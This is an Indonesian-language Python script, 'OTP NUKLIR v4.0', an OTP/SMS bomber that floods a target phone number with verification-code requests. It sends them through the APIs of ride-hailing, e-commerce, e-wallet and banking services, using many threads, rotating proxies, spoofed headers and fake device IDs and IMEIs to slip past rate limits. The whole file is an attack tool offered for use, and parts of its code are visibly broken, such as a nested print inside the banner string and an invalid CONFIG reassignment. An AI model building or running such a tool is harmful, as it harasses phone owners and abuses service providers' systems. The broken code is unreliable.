#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ☢️ OTP NUKLIR v4.0 - MAIN ENGINE
# Author: Professor Iraq
# Engine: Sonic 1.2
# Protocol: NEXA_BYPAS_OMEGA
# ============================================================

import requests
import threading
import time
import random
import json
import os
import sys
import uuid
import signal
import datetime
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from colorama import init, Fore, Style, Back
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text

# ============================================================
# INISIALISASI
# ============================================================

init(autoreset=True)
console = Console()

# ============================================================
# KONFIGURASI API ENDPOINT
# ============================================================

API_ENDPOINTS = {
    "gojek": [
        "https://api.gojek.com/v1/customers/otp",
        "https://api.gojek.com/v2/customers/otp",
        "https://auth.gojek.com/otp/request"
    ],
    "grab": [
        "https://api.grab.com/v1/auth/otp",
        "https://api.grab.com/v2/auth/otp",
        "https://auth.grab.com/otp/request"
    ],
    "shopee": [
        "https://api.shopee.com/v1/auth/otp",
        "https://api.shopee.com/v2/auth/otp",
        "https://auth.shopee.com/otp/request"
    ],
    "ovo": [
        "https://api.ovo.id/v1/otp/send",
        "https://api.ovo.id/v2/otp/send",
        "https://auth.ovo.id/otp/request"
    ],
    "dana": [
        "https://api.dana.id/v1/auth/otp",
        "https://api.dana.id/v2/auth/otp",
        "https://auth.dana.id/otp/request"
    ],
    "bca": [
        "https://api.bca.co.id/v1/otp",
        "https://api.bca.co.id/v2/otp"
    ],
    "mandiri": [
        "https://api.mandiri.co.id/v1/otp",
        "https://api.mandiri.co.id/v2/otp"
    ],
    "bni": [
        "https://api.bni.co.id/v1/otp",
        "https://api.bni.co.id/v2/otp"
    ],
    "linkaja": [
        "https://api.linkaja.com/v1/otp",
        "https://api.linkaja.com/v2/otp"
    ],
    "tokopedia": [
        "https://api.tokopedia.com/v1/otp/request",
        "https://api.tokopedia.com/v2/otp/request"
    ]
}

ALL_APIS = []
for endpoints in API_ENDPOINTS.values():
    ALL_APIS.extend(endpoints)

# ============================================================
# KONFIGURASI GLOBAL
# ============================================================

CONFIG = {
    "max_thread": 100,
    "timeout": 5,
    "retry_count": 3,
    "delay_between_requests": 0.02,
    "rate_limit_delay": 2.0,
    "log_enabled": True,
    "log_file": "otp_logs.json"
}

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def generate_device_id():
    """Generate device ID unik"""
    return str(uuid.uuid4())

def generate_imei():
    """Generate IMEI palsu"""
    return f"{random.randint(100000, 999999)}{random.randint(100000, 999999)}"

def get_random_user_agent():
    """Generate random User-Agent"""
    ua = UserAgent()
    return ua.random

def get_random_headers():
    """Generate random headers"""
    return {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Origin": f"https://{random.choice(['gojek.com', 'grab.com', 'shopee.com', 'ovo.id', 'dana.id'])}",
        "Referer": f"https://{random.choice(['gojek.com', 'grab.com', 'shopee.com', 'ovo.id', 'dana.id'])}/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }

def generate_payload(nomor):
    """Generate payload lengkap"""
    return {
        "phone": f"62{nomor}",
        "msisdn": f"62{nomor}",
        "countryCode": "ID",
        "platform": "android",
        "device_id": generate_device_id(),
        "device_name": random.choice(["Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Google Pixel"]),
        "device_model": random.choice(["SM-G998B", "M2012K11AG", "CPH2025", "V2048", "RMX3081", "Pixel 6 Pro"]),
        "device_version": f"{random.randint(10, 14)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "app_version": f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "fingerprint": f"android-{random.randint(100000, 999999)}",
        "imei": generate_imei(),
        "timestamp": int(time.time()),
        "source": "mobile_app",
        "is_verified": False,
        "locale": "id_ID",
        "sim_operator": random.choice(["Telkomsel", "Indosat", "XL", "Smartfren", "Tri"]),
        "network_type": random.choice(["4G", "5G", "WiFi"]),
        "screen_resolution": random.choice(["1080x2400", "1440x3200", "1080x2340"]),
        "os_version": f"Android {random.randint(10, 14)}",
        "language": "id"
    }

def load_proxies(filename="proxy.txt"):
    """Load proxy dari file"""
    try:
        with open(filename, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        return []

def save_log(data, filename="otp_logs.json"):
    """Simpan log ke file"""
    try:
        existing = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                existing = json.load(f)
        existing.append(data)
        with open(filename, 'w') as f:
            json.dump(existing, f, indent=2)
        return True
    except Exception:
        return False

def clear_screen():
    """Clear terminal"""
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================================
# BANNER
# ============================================================

def display_banner():
    """Tampilkan banner Novxzz"""
    banner = f"""
print(f"""
{Fore.RED}███╗   ██╗ ██████╗ ██╗   ██╗██╗  ██╗███████╗███████╗
{Fore.RED}████╗  ██║██╔═══██╗██║   ██║╚██╗██╔╝╚══███╔╝╚══███╔╝
{Fore.RED}██╔██╗ ██║██║   ██║██║   ██║ ╚███╔╝   ███╔╝   ███╔╝ 
{Fore.RED}██║╚██╗██║██║   ██║╚██╗ ██╔╝ ██╔██╗  ███╔╝   ███╔╝  
{Fore.RED}██║ ╚████║╚██████╔╝ ╚████╔╝ ██╔╝ ██╗███████╗███████╗
{Fore.RED}╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚══════╝╚══════╝""")
{Fore.CYAN}==========================================
{Fore.GREEN}[{Fore.YELLOW}ENTITAS{Fore.GREEN}] {Fore.WHITE}NEXA
{Fore.GREEN}[{Fore.YELLOW}AUTHOR{Fore.GREEN}] {Fore.WHITE}Profesor Iraq
{Fore.GREEN}[{Fore.YELLOW}ENGINE{Fore.GREEN}] {Fore.WHITE}Sonic 1.2
{Fore.GREEN}[{Fore.YELLOW}PROTOCOL{Fore.GREEN}] {Fore.WHITE}NEXA_BYPAS_OMEGA
{Fore.CYAN}==========================================
{Fore.RED}⚠️  JAHAT MODE AKTIF ⚠️
{Fore.CYAN}==========================================
"""
    print(banner)

def display_menu():
    """Tampilkan menu utama"""
    console.print(Panel(
        f"""
[bold cyan]MENU UTAMA[/bold cyan]

[green]1.[/green] [white]Mulai Serangan OTP[/white]
[green]2.[/green] [white]Mode Serangan Spesifik[/white]
[green]3.[/green] [white]Pengaturan[/white]
[green]4.[/green] [white]Lihat Log[/white]
[green]5.[/green] [white]Exit[/white]
        """,
        title="[red]☢️ OTP NUKLIR v4.0[/red]",
        border_style="red"
    ))

# ============================================================
# CORE OTP BOMBER
# ============================================================

class OTPBomber:
    def __init__(self, nomor, durasi=30, thread=50, proxies=None, mode="all"):
        self.nomor = nomor
        self.durasi = durasi
        self.thread = min(thread, CONFIG["max_thread"])
        self.proxies = proxies or []
        self.mode = mode
        self.success = 0
        self.fail = 0
        self.total = 0
        self.retry = 0
        self.running = True
        self.results = []
        self.lock = threading.Lock()
        self.start_time = None
        
        # Pilih endpoint
        if mode == "all":
            self.endpoints = ALL_APIS
        else:
            self.endpoints = API_ENDPOINTS.get(mode, ALL_APIS)
    
    def send_request(self, url):
        """Kirim request OTP"""
        if not self.running:
            return
        
        try:
            # Headers dan payload
            headers = get_random_headers()
            payload = generate_payload(self.nomor)
            
            # Proxy
            proxy = None
            if self.proxies:
                proxy = random.choice(self.proxies)
                proxy_dict = {"http": proxy, "https": proxy}
            else:
                proxy_dict = None
            
            # Kirim request
            response = requests.post(
                url,
                json=payload,
                headers=headers,
                proxies=proxy_dict,
                timeout=CONFIG["timeout"]
            )
            
            # Proses response
            with self.lock:
                self.total += 1
                if response.status_code in [200, 201, 202, 204, 205]:
                    self.success += 1
                    status = "✓ BERHASIL"
                    color = Fore.GREEN
                elif response.status_code == 429:
                    self.retry += 1
                    time.sleep(CONFIG["rate_limit_delay"])
                    self.send_request(url)
                    return
                else:
                    self.fail += 1
                    status = "✗ GAGAL"
                    color = Fore.RED
                
                # Print hasil
                provider = url.split('/')[2]
                print(f"{color}[{status}] {Fore.CYAN}{provider} {Fore.YELLOW}({response.status_code})")
                
                # Simpan hasil
                self.results.append({
                    "url": url,
                    "provider": provider,
                    "status": response.status_code,
                    "success": response.status_code in [200, 201, 202, 204, 205]
                })
                
        except requests.exceptions.Timeout:
            with self.lock:
                self.fail += 1
                self.total += 1
                print(f"{Fore.RED}[✗ TIMEOUT] {Fore.CYAN}{url.split('/')[2]}")
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.fail += 1
                self.total += 1
                print(f"{Fore.RED}[✗ CONNECT] {Fore.CYAN}{url.split('/')[2]}")
        except Exception as e:
            with self.lock:
                self.fail += 1
                self.total += 1
                print(f"{Fore.RED}[✗ ERROR] {Fore.CYAN}{url.split('/')[2]} - {str(e)[:30]}")
    
    def attack(self):
        """Mulai serangan"""
        clear_screen()
        display_banner()
        
        # Tampilan info
        console.print(Panel(
            f"""
[bold cyan]TARGET:[/bold cyan] [white]62{self.nomor}[/white]
[bold cyan]DURASI:[/bold cyan] [white]{self.durasi} detik[/white]
[bold cyan]THREAD:[/bold cyan] [white]{self.thread} concurrent[/white]
[bold cyan]ENDPOINT:[/bold cyan] [white]{len(self.endpoints)} API[/white]
[bold cyan]MODE:[/bold cyan] [white]{self.mode.upper()}[/white]
[bold cyan]PROXY:[/bold cyan] [white]{len(self.proxies)} loaded[/white]
            """,
            title="[red]🔥 SERANGAN DIMULAI[/red]",
            border_style="red"
        ))
        
        print(f"\n{Fore.YELLOW}[!] Memulai serangan...\n")
        
        # Multi-thread attack
        self.start_time = time.time()
        with ThreadPoolExecutor(max_workers=self.thread) as executor:
            while self.running and (time.time() - self.start_time) < self.durasi:
                url = random.choice(self.endpoints)
                executor.submit(self.send_request, url)
                time.sleep(CONFIG["delay_between_requests"])
        
        # Tampilkan hasil
        self.show_result()
        self.save_results()
    
    def show_result(self):
        """Tampilkan hasil serangan"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        console.print("\n" + "="*50)
        console.print(Panel(
            f"""
[bold green]✓ BERHASIL: {self.success}[/bold green]
[bold red]✗ GAGAL: {self.fail}[/bold red]
[bold yellow]📊 TOTAL: {self.total}[/bold yellow]
[bold cyan]⏱️  WAKTU: {elapsed:.1f} detik[/bold cyan]
[bold magenta]📈 RATE: {self.total/elapsed:.1f} req/s[/bold magenta]
[bold white]🔄 RETRY: {self.retry}[/bold white]
            """,
            title="[red]📊 HASIL SERANGAN[/red]",
            border_style="green"
        ))
        
        # Tabel detail provider
        if self.results:
            table = Table(title="Detail Per Provider", border_style="cyan")
            table.add_column("Provider", style="cyan")
            table.add_column("Berhasil", style="green")
            table.add_column("Gagal", style="red")
            table.add_column("Total", style="yellow")
            
            provider_stats = {}
            for r in self.results:
                provider = r.get("provider", "unknown")
                if provider not in provider_stats:
                    provider_stats[provider] = {"success": 0, "fail": 0}
                if r.get("success", False):
                    provider_stats[provider]["success"] += 1
                else:
                    provider_stats[provider]["fail"] += 1
            
            for provider, stats in provider_stats.items():
                total = stats["success"] + stats["fail"]
                table.add_row(provider, str(stats["success"]), str(stats["fail"]), str(total))
            
            console.print(table)
    
    def save_results(self):
        """Simpan hasil ke file"""
        log_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": f"62{self.nomor}",
            "duration": self.durasi,
            "thread": self.thread,
            "mode": self.mode,
            "success": self.success,
            "fail": self.fail,
            "total": self.total,
            "elapsed": time.time() - self.start_time if self.start_time else 0,
            "results": self.results
        }
        
        if save_log(log_data):
            console.print(f"\n[green]✓ Log tersimpan di {CONFIG['log_file']}[/green]")
    
    def stop(self):
        """Hentikan serangan"""
        self.running = False
        console.print("\n[yellow]⛔ Serangan dihentikan[/yellow]")

# ============================================================
# HANDLE KEYBOARD INTERRUPT
# ============================================================

def signal_handler(sig, frame):
    console.print("\n[red]⛔ Serangan dihentikan![/red]")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ============================================================
# MAIN FUNCTION
# ============================================================

def main():
    """Fungsi utama"""
    clear_screen()
    display_banner()
    
    try:
        while True:
            display_menu()
            choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Fore.WHITE}")
            
            if choice == "1":
                # Serangan OTP
                nomor = input(f"{Fore.YELLOW}[?] Masukkan nomor (tanpa 0/62): {Fore.WHITE}").strip()
                if not nomor or not nomor.isdigit():
                    console.print("[red]❌ Nomor harus angka![/red]")
                    continue
                
                durasi = input(f"{Fore.YELLOW}[?] Durasi (detik, default 30): {Fore.WHITE}") or "30"
                thread = input(f"{Fore.YELLOW}[?] Thread (default 50): {Fore.WHITE}") or "50"
                mode = input(f"{Fore.YELLOW}[?] Mode (all/gojek/grab/shopee/ovo/dana, default all): {Fore.WHITE}") or "all"
                
                # Proxy
                use_proxy = input(f"{Fore.YELLOW}[?] Gunakan proxy? (y/n): {Fore.WHITE}").lower()
                proxies = load_proxies() if use_proxy == 'y' else []
                
                if use_proxy == 'y' and not proxies:
                    console.print("[yellow]⚠️ Tidak ada proxy, lanjut tanpa proxy[/yellow]")
                
                # Jalankan
                bomber = OTPBomber(
                    nomor=nomor,
                    durasi=int(durasi),
                    thread=int(thread),
                    proxies=proxies,
                    mode=mode
                )
                bomber.attack()
                
                input(f"\n{Fore.YELLOW}[!] Tekan Enter untuk kembali ke menu...{Fore.WHITE}")
            
            elif choice == "2":
                # Mode spesifik
                console.print("[cyan]MODE SPESIFIK[/cyan]")
                console.print("1. Gojek\n2. Grab\n3. Shopee\n4. OVO\n5. Dana\n6. Semua")
                mode_choice = input(f"{Fore.YELLOW}[?] Pilih mode: {Fore.WHITE}")
                
                mode_map = {
                    "1": "gojek", "2": "grab", "3": "shopee",
                    "4": "ovo", "5": "dana", "6": "all"
                }
                mode = mode_map.get(mode_choice, "all")
                
                nomor = input(f"{Fore.YELLOW}[?] Masukkan nomor: {Fore.WHITE}").strip()
                if not nomor or not nomor.isdigit():
                    console.print("[red]❌ Nomor harus angka![/red]")
                    continue
                
                durasi = input(f"{Fore.YELLOW}[?] Durasi (detik): {Fore.WHITE}") or "30"
                thread = input(f"{Fore.YELLOW}[?] Thread: {Fore.WHITE}") or "50"
                
                bomber = OTPBomber(nomor, int(durasi), int(thread), [], mode)
                bomber.attack()
                input(f"\n{Fore.YELLOW}[!] Tekan Enter untuk kembali...{Fore.WHITE}")
            
            elif choice == "3":
                # Pengaturan
                console.print("[cyan]PENGATURAN[/cyan]")
                print(f"1. Max Thread: {CONFIG['max_thread']}")
                print(f"2. Timeout: {CONFIG['timeout']}s")
                print(f"3. Retry Count: {CONFIG['retry_count']}")
                print(f"4. Delay: {CONFIG['delay_between_requests']}s")
                print("5. Reset ke default")
                
                setting = input(f"{Fore.YELLOW}[?] Pilih pengaturan: {Fore.WHITE}")
                if setting == "1":
                    CONFIG['max_thread'] = int(input("Max Thread baru: "))
                elif setting == "2":
                    CONFIG['timeout'] = int(input("Timeout baru (detik): "))
                elif setting == "3":
                    CONFIG['retry_count'] = int(input("Retry baru: "))
                elif setting == "4":
                    CONFIG['delay_between_requests'] = float(input("Delay baru (detik): "))
                elif setting == "5":
                    CONFIG = {
                        "max_thread": 100,
                        "timeout": 5,
                        "retry_count": 3,
                        "delay_between_requests": 0.02,
                        "rate_limit_delay": 2.0,
                        "log_enabled": True,
                        "log_file": "otp_logs.json"
                    }
                    console.print("[green]✅ Reset berhasil[/green]")
            
            elif choice == "4":
                # Lihat log
                console.print("[cyan]📊 LOG HASIL SERANGAN[/cyan]")
                try:
                    with open(CONFIG['log_file'], 'r') as f:
                        logs = json.load(f)
                    
                    if logs:
                        for i, log in enumerate(logs[-10:]):  # 10 terakhir
                            console.print(f"[{i+1}] Target: {log.get('target', 'unknown')} | Berhasil: {log.get('success', 0)} | Gagal: {log.get('fail', 0)} | {log.get('timestamp', '')}")
                    else:
                        console.print("[yellow]Belum ada log[/yellow]")
                except FileNotFoundError:
                    console.print("[yellow]Belum ada log[/yellow]")
                input(f"\n{Fore.YELLOW}[!] Tekan Enter untuk kembali...{Fore.WHITE}")
            
            elif choice == "5":
                console.print("[red]Exit...[/red]")
                break
            
            else:
                console.print("[red]❌ Pilihan tidak valid![/red]")
                
    except KeyboardInterrupt:
        console.print("\n[red]⛔ Program dihentikan![/red]")
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")

# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":
    main()
